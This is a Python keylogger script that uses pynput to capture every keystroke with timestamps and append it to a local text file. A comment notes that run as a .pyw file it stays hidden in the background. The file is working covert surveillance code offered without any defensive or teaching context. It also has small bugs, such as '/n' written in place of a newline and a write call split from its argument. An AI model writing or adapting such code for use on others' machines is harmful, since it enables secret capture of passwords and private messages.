import logging

logging.basicConfig(filename='keylogger_errors.log', level=logging.DEBUG)

try:
    
    # using pyw, it is running in background not visible on terminal

    from pynput.keyboard import Key, Listener
    from datetime import datetime

    count = 0
    keys =[]

    # a means append(dont over write)
    # datetime[-7] for last only
    with open('keylogger.txt', 'a') as f:
        f.write('TimeStamp'+(str(datetime.now()))[:-7]+':\n')
        f.write('/n')


    def on_press(key):
        global count, keys # global so in main directly
        keys.append(key)
        count += 1 # five keystrokes in array and then writing in text file for fast progress
        if count >= 5:
            count = 0
            write_file(keys)
            keys = []

    # 
    def on_release(key):
        if key == Key.esc:
            return False     # no more keystroke implemented after using esc
        

    def write_file(keys):
        with open('keylogger.txt', 'a') as f:
            timestamp = str(datetime.now())[:-7]  # Getting current timestamp
            f.write(f'\n[{timestamp}] ')  # Writing the timestamp to the file
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('space') > 0 and k.find('backspace') == -1:
                    f.write('\n')
                elif k.find('key') == -1:
                    f.write(k)



    # main method : listener is a context manager(closes itself) 
    # on press and on relase methods defined upr are invoked
    if __name__ == '__main__':
        with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
            listener.join()

        with open('keylogger.txt','a') as f:
            f.write('\n\n')
            f.write   # for each session this line comes
            ('-------------------------------------------------------')
            f.write('/n/n')

except Exception as e:
    logging.exception("An error occurred")
